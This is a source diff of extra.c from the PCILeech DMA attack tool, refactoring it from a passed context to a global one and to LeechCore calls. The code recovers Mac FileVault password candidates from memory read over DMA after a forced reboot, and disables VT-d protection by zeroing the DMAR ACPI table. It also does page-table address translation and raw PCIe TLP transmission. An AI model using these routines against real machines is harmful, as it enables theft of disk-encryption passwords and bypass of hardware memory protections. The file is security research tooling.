@@ -1,13 +1,13 @@
 // extra.c : implementation related various extra functionality such as exploits.
 //
-// (c) Ulf Frisk, 2016-2018
+// (c) Ulf Frisk, 2016-2019
 // Author: Ulf Frisk, pcileech@frizk.net
 //
 #include "extra.h"
 #include "device.h"
 #include "util.h"
 
-VOID Extra_MacFVRecover_ReadMemory_Optimized(_Inout_ PPCILEECH_CONTEXT ctx, _Inout_ PBYTE pb512M)
+VOID Extra_MacFVRecover_ReadMemory_Optimized(_Inout_ PBYTE pb512M)
 {
     DWORD i, dwOffsets[] = {
         0x74000000, 0x75000000, 0x76000000, 0x77000000, 0x78000000, 0x79000000, 0x7a000000, 0x7b000000,
@@ -16,7 +16,7 @@ VOID Extra_MacFVRecover_ReadMemory_Optimized(_Inout_ PPCILEECH_CONTEXT ctx, _Ino
         0x88000000, 0x89000000, 0x8a000000, 0x8b000000, 0x8c000000, 0x8d000000, 0x8e000000, 0x8f000000
     };
     for(i = 0; i < sizeof(dwOffsets) / sizeof(DWORD); i++) {
-        DeviceReadDMAEx(ctx, dwOffsets[i], pb512M + dwOffsets[i] - 0x70000000, 0x01000000, NULL, PCILEECH_FLAG_MEM_EX_FASTFAIL);
+        DeviceReadDMAEx(dwOffsets[i], pb512M + dwOffsets[i] - 0x70000000, 0x01000000, NULL, 0);
     }
 }
 
@@ -68,13 +68,13 @@ BOOL Extra_MacFVRecover_Analyze(_In_ PBYTE pb512M)
     return isFound;
 }
 
-VOID Extra_MacFVRecover_SetOutFileName(_Inout_ PCONFIG pCfg)
+VOID Extra_MacFVRecover_SetOutFileName()
 {
     SYSTEMTIME st;
-    if(pCfg->szFileOut[0] == 0) {
+    if(ctxMain->cfg.szFileOut[0] == 0) {
         GetLocalTime(&st);
         _snprintf_s(
-            pCfg->szFileOut,
+            ctxMain->cfg.szFileOut,
             MAX_PATH,
             _TRUNCATE,
             "pcileech-mac-fvrecover-%i%02i%02i-%02i%02i%02i.raw",
@@ -87,7 +87,7 @@ VOID Extra_MacFVRecover_SetOutFileName(_Inout_ PCONFIG pCfg)
     }
 }
 
-VOID Action_MacFilevaultRecover(_Inout_ PPCILEECH_CONTEXT ctx, _In_ BOOL IsRebootRequired)
+VOID Action_MacFilevaultRecover(_In_ BOOL IsRebootRequired)
 {
     FILE *pFile = NULL;
     PBYTE pbBuffer512M;
@@ -102,30 +102,30 @@ VOID Action_MacFilevaultRecover(_Inout_ PPCILEECH_CONTEXT ctx, _In_ BOOL IsReboo
             "MAC_FVRECOVER: WAITING ... please reboot ...\n" \
             "  Please force a reboot of the mac by pressing CTRL+CMD+POWER\n" \
             "  WARNING! This will not work in macOS Sierra 10.12.2 and later.\n");
-        Util_WaitForPowerCycle(ctx);
+        Util_WaitForPowerCycle();
     } else {
         // Wait for DMA read access to target computer.
         printf("MAC_FVRECOVER: WAITING for DMA access ...\n");
-        Util_WaitForPowerOn(ctx);
+        Util_WaitForPowerOn();
     }
     // Try read 512M of memory from in the range: [0x70000000..0x90000000[.
     printf("MAC_FVRECOVER: Continuing ...\n");
-    Extra_MacFVRecover_ReadMemory_Optimized(ctx, pbBuffer512M);
+    Extra_MacFVRecover_ReadMemory_Optimized(pbBuffer512M);
     // Try write to disk image.
     printf("MAC_FVRECOVER: Writing partial memory contents to file ...\n");
-    Extra_MacFVRecover_SetOutFileName(ctx->cfg);
-    if(!fopen_s(&pFile, ctx->cfg->szFileOut, "r") || pFile) {
+    Extra_MacFVRecover_SetOutFileName();
+    if(!fopen_s(&pFile, ctxMain->cfg.szFileOut, "r") || pFile) {
         printf("MAC_FVRECOVER: Error writing partial memory contents to file. File exists.\n");
         if(pFile) { fclose(pFile); }
         pFile = NULL;
-    } else if(fopen_s(&pFile, ctx->cfg->szFileOut, "wb") || !pFile) {
+    } else if(fopen_s(&pFile, ctxMain->cfg.szFileOut, "wb") || !pFile) {
         printf("MAC_FVRECOVER: Error writing partial memory contents to file.\n");
         pFile = NULL;
     }
     else if(0x20000000 != fwrite(pbBuffer512M, 1, 0x20000000, pFile)) {
         printf("MAC_FVRECOVER: Error writing partial memory contents to file.\n");
     } else {
-        printf("MAC_FVRECOVER: File: %s.\n", ctx->cfg->szFileOut);
+        printf("MAC_FVRECOVER: File: %s.\n", ctxMain->cfg.szFileOut);
     }
     // Analyze for possible password candidates.
     printf("MAC_FVRECOVER: Analyzing ...\n");
@@ -139,7 +139,7 @@ VOID Action_MacFilevaultRecover(_Inout_ PPCILEECH_CONTEXT ctx, _In_ BOOL IsReboo
     if(pFile) { fclose(pFile); }
 }
 
-VOID Action_MacDisableVtd(_Inout_ PPCILEECH_CONTEXT ctx)
+VOID Action_MacDisableVtd()
 {
     PBYTE pb16M;
     BYTE ZERO16[16] = { 0 };
@@ -153,15 +153,15 @@ VOID Action_MacDisableVtd(_Inout_ PPCILEECH_CONTEXT ctx)
     }
     // Wait for DMA read access to target computer.
     printf("MAC_DISABLE_VTD: WAITING for DMA access ...\n");
-    Util_WaitForPowerOn(ctx);
+    Util_WaitForPowerOn();
     // DMAR table assumed to be on page boundary. This doesn't have to be true,
     // but it seems like it is on the MACs.
     for(i = 0; i < sizeof(dwOffsets) / sizeof(DWORD); i++) {
-        if(DeviceReadDMAEx(ctx, dwOffsets[i], pb16M, 0x01000000, NULL, PCILEECH_FLAG_MEM_EX_FASTFAIL)) {
+        if(DeviceReadDMAEx(dwOffsets[i], pb16M, 0x01000000, NULL, 0)) {
             for(j = 0; j < 0x01000000; j += 0x1000) {
                 if(*(PQWORD)(pb16M + j) == 0x0000008852414d44) {
                     dwAddress = dwOffsets[i] + j;
-                    if(DeviceWriteDMA(ctx, dwAddress, ZERO16, 16, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
+                    if(LeechCore_Write(dwAddress, ZERO16, 16)) {
                         printf("MAC_DISABLE_VTD: VT-d DMA protections should now be disabled ...\n");
                         printf("MAC_DISABLE_VTD: DMAR ACPI table found and removed at: 0x%08x\n", dwAddress);
                         LocalFree(pb16M);
@@ -175,16 +175,16 @@ VOID Action_MacDisableVtd(_Inout_ PPCILEECH_CONTEXT ctx)
     printf("MAC_DISABLE_VTD: Failed to disable VT-d DMA protections.\n");
 }
 
-VOID Action_PT_Phys2Virt(_Inout_ PPCILEECH_CONTEXT ctx)
+VOID Action_PT_Phys2Virt()
 {
     BOOL result;
     QWORD qwVA, qwPTE, qwPDE, qwPDPTE, qwPML4E;
     printf("PT_PHYS2VIRT: searching ... (this may take some time).\n");
-    result = Util_PageTable_FindMappedAddress(ctx, ctx->cfg->qwCR3, ctx->cfg->qwDataIn[0], &qwVA, &qwPTE, &qwPDE, &qwPDPTE, &qwPML4E);
+    result = Util_PageTable_FindMappedAddress(ctxMain->cfg.qwCR3, ctxMain->cfg.qwDataIn[0], &qwVA, &qwPTE, &qwPDE, &qwPDPTE, &qwPML4E);
     if(result) {
         printf("PT_PHYS2VIRT: finished.\n");
         printf("          0x00000000FFFFFFFF\n");
-        printf("   PA:    0x%016llx\n", ctx->cfg->qwDataIn[0]);
+        printf("   PA:    0x%016llx\n", ctxMain->cfg.qwDataIn[0]);
         printf("   VA:    0x%016llx\n", qwVA);
         printf("   PTE:   0x%016llx\n", qwPTE);
         printf("   PDE:   0x%016llx\n", qwPDE);
@@ -195,43 +195,43 @@ VOID Action_PT_Phys2Virt(_Inout_ PPCILEECH_CONTEXT ctx)
     }
 }
 
-VOID Action_PT_Virt2Phys(_Inout_ PPCILEECH_CONTEXT ctx)
+VOID Action_PT_Virt2Phys()
 {
     BOOL result;
     QWORD qwPA, qwPageBase, qwPageSize;
-    result = Util_PageTable_Virtual2Physical(ctx, ctx->cfg->qwCR3, ctx->cfg->qwDataIn[0], &qwPA, &qwPageBase, &qwPageSize);
+    result = Util_PageTable_Virtual2Physical(ctxMain->cfg.qwCR3, ctxMain->cfg.qwDataIn[0], &qwPA, &qwPageBase, &qwPageSize);
     if(result) {
         printf("PT_VIRT2PHYS: Successful.\n");
         printf("               0x00000000FFFFFFFF\n");
-        printf("   VA:         0x%016llx\n", ctx->cfg->qwDataIn[0]);
+        printf("   VA:         0x%016llx\n", ctxMain->cfg.qwDataIn[0]);
         printf("   PA:         0x%016llx\n", qwPA);
         printf("   PG SIZE:    0x%016llx\n", qwPageSize);
         printf("   PG BASE PA: 0x%016llx\n", qwPageBase);
-        printf("   CR3/PML4:   0x%016llx\n", ctx->cfg->qwCR3);
+        printf("   CR3/PML4:   0x%016llx\n", ctxMain->cfg.qwCR3);
     } else {
         printf("PT_VIRT2PHYS: Failed.\n");
     }
 }
 
-VOID Action_TlpTx(_Inout_ PPCILEECH_CONTEXT ctx)
+VOID Action_TlpTx()
 {
-    if(ctx->cfg->cbIn < 12) {
+    if(ctxMain->cfg.cbIn < 12) {
         printf("Action_TlpTx: Invalid TLP (too short).\n");
         return;
     }
-    if(ctx->cfg->cbIn % 4) {
+    if(ctxMain->cfg.cbIn % 4) {
         printf("Action_TlpTx: Invalid TLP (length not multiple of 4).\n");
         return;
     }
-    printf("TLP: Transmitting PCIe TLP.%s\n", ctx->cfg->fVerboseExtra ? "" : " (use -vvv option for detailed info).");
-    if(ctx->cfg->fLoop) {
+    printf("TLP: Transmitting PCIe TLP.%s\n", ctxMain->cfg.fVerboseExtra ? "" : " (use -vvv option for detailed info).");
+    if(ctxMain->cfg.fLoop) {
         printf("TLP: Starting loop TLP transmit. Press CTRL+C to abort.\n");
         while(TRUE) {
-            DeviceWriteTlp(ctx, ctx->cfg->pbIn, (DWORD)ctx->cfg->cbIn);
-            DeviceListenTlp(ctx, 100);
+            LeechCore_CommandData(LEECHCORE_COMMANDDATA_FPGA_WRITE_TLP, ctxMain->cfg.pbIn, (DWORD)ctxMain->cfg.cbIn, NULL, 0, NULL);
+            LeechCore_CommandData(LEECHCORE_COMMANDDATA_FPGA_LISTEN_TLP, NULL, 0, NULL, 100, NULL);
         }
         return;
     }
-    DeviceWriteTlp(ctx, ctx->cfg->pbIn, (DWORD)ctx->cfg->cbIn);
-    DeviceListenTlp(ctx, 100);
+    LeechCore_CommandData(LEECHCORE_COMMANDDATA_FPGA_WRITE_TLP, ctxMain->cfg.pbIn, (DWORD)ctxMain->cfg.cbIn, NULL, 0, NULL);
+    LeechCore_CommandData(LEECHCORE_COMMANDDATA_FPGA_LISTEN_TLP, NULL, 0, NULL, 100, NULL);
 }
